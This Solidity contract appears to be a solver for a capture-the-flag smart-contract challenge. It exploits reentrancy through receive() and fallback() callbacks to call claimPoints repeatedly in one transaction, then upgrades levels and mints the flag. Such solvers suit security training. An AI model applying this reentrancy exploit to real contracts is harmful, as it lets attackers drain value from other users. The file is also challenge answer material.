// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICh6 {
    function resetPoints() external;
    function claimPoints() external;
    function upgradeLevel() external;
    function mintFlag() external;
    function points(address) external view returns (uint8);
    function levels(address) external view returns (uint8);
}

contract S2C6SolverStep {
    ICh6 public constant C = ICh6(0xd523DfA613b8c5fA352ED02D6cB2fE1ed83901CE);

    uint256 private remaining;

    receive() external payable { _cb(); }
    fallback() external payable { _cb(); }

    function _cb() internal {
        if (remaining > 0) {
            remaining--;
            C.claimPoints();
        }
    }

    /// Farm n pontos numa tx (n <= 120 recomendado; 100 é bem seguro)
    function farm(uint256 n) external {
        require(n >= 1 && n <= 120, "use 1..120");
        remaining = n - 1;
        C.claimPoints();
        require(remaining == 0, "farm incomplete");
    }

    function upgradeMany(uint256 times) external {
        for (uint256 i = 0; i < times; i++) C.upgradeLevel();
    }

    function reset() external { C.resetPoints(); }

    function mint() external { C.mintFlag(); }

    function status() external view returns (uint8 p, uint8 l) {
        p = C.points(tx.origin);
        l = C.levels(tx.origin);
    }
}
